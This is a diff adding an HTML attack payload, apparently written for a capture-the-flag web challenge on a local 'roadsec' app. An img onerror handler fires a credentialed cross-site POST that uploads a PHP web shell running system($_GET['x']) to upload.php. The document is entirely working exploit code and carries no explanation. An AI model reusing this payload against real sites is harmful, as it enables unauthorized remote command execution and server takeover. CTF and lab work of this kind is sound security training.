@@ -1,0 +1,30 @@
+<img src="x" onerror=submitRequest()>
+  <script>
+    function submitRequest()
+    {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "http://localhost/roadsec-web-1/web/upload.php", true);
+      xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+      xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
+      xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------256672629917035");
+      xhr.withCredentials = "true";
+      var body = "-----------------------------256672629917035\r\n" +
+        "Content-Disposition: form-data; name=\"submit\"\r\n" +
+        "\r\n" +
+        "Submit" +
+        "\r\n" +
+        "-----------------------------256672629917035\r\n" +
+        "Content-Disposition: form-data; name=\"file\"; filename=\"desecroadsecflag.php7\"\r\n" +
+        "Content-Type: text/plain\r\n" +
+        "\r\n" +
+        "<?php echo 'worked:\n'; system($_GET['x']); ?>\r\n" +
+        "-----------------------------256672629917035--\r\n";
+      var aBody = new Uint8Array(body.length);
+      for (var i = 0; i < aBody.length; i++)
+        aBody[i] = body.charCodeAt(i);
+      xhr.send(new Blob([aBody]));
+    }
+  </script>
+  <form action="#">
+    <input type="submit" value="Submit request" onclick="submitRequest();" />
+  </form>
